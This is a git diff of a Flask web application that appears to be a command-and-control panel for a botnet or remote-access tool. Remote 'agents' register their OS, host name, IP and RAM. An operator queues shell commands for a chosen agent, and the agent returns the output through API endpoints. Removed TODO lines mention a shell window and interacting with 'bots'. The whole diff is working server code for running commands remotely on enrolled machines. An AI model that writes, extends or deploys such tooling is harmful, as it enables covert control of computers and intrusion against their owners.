@@ -2,6 +2,7 @@ from flask import Flask, render_template, redirect, url_for, request, session, f
 from flask_sqlalchemy import SQLAlchemy
 from functools import wraps
 from config import BaseConfig
+import time
 
 # create the application object
 app = Flask(__name__)
@@ -16,10 +17,7 @@ from models import Agent, CommandQueue
 
 # TODO
 """
-- Add shell window where you can send commands and receive output
-- Interact with bots
 - Make fronted look clean
-- Add api end point for command output
 
 """
 
@@ -32,6 +30,7 @@ def login_required(f):
         else:
             flash('You need to login first.')
             return redirect(url_for('login'))
+
     return wrap
 
 
@@ -42,25 +41,28 @@ def add_agent(os, host_name, ip, ram):
         db.session.flush()
         agent_id = agent.id
         print(agent_id)
-        db.session.add(CommandQueue(agent_id, 'ls'))
+        db.session.add(CommandQueue(agent_id, 'ls', 'asd'))
         db.session.commit()
         print(agent_id)
         return agent.id
 
 
-# def add_command(queue: CommandQueue, command):
-#     queue.command = command
-
-
 @app.route('/', methods=['GET', 'POST'])
 @login_required
 def home():  # put application's code here
+    output = ""
     if request.method == "POST":
         command = request.form['command']
-        db.session.query(CommandQueue).all()
+        agent_id = request.form['id']
+        res = CommandQueue.query.filter_by(id=agent_id).first()
+        res.command = command
+        db.session.commit()
+        time.sleep(1)
+        res = CommandQueue.query.filter_by(id=agent_id).first()
+        output = res.output
 
     agents = db.session.query(Agent).all()
-    return render_template('index.html', agents=agents)
+    return render_template('index.html', agents=agents, command_out=output)
 
 
 @app.route('/api/1.1/add_agent', methods=['GET', 'POST'])
@@ -69,7 +71,6 @@ def agent_add():
     if request.method == 'POST':
         agent_dict = request.json
         id = add_agent(agent_dict['os'], agent_dict['host_name'], agent_dict['ip'], agent_dict['ram'])
-        print(id)
         return str(id)
 
 
@@ -78,9 +79,8 @@ def get_command():
     print(request.method)
     if request.method == 'POST':
         agent_id = request.json['id']
-        print(agent_id)
-        res = db.session.query(CommandQueue).one()
-        return res.__dict__['command']
+        res = CommandQueue.query.filter_by(id=agent_id).first()
+        return res.command
 
 
 @app.route('/api/1.1/command_out', methods=['GET', 'POST'])
@@ -88,15 +88,14 @@ def command_out():
     print(request.method)
     if request.method == 'POST':
         output = request.json['output']
-        print(output)
+        agent_id = request.json['id']
+        # print(output, agent_id)
+        agent = CommandQueue.query.filter_by(id=agent_id).first()
+        agent.output = output
+        agent.command = 'None'
+        # print(agent.output)
+        db.session.commit()
         return 'Received'
-
-
-@app.route('/api/1.1/send_command', methods=['GET', 'POST'])
-def send_command():
-    if request.method == 'POST':
-        print(request.data)
-        return '1'
 
 
 @app.route('/welcome')
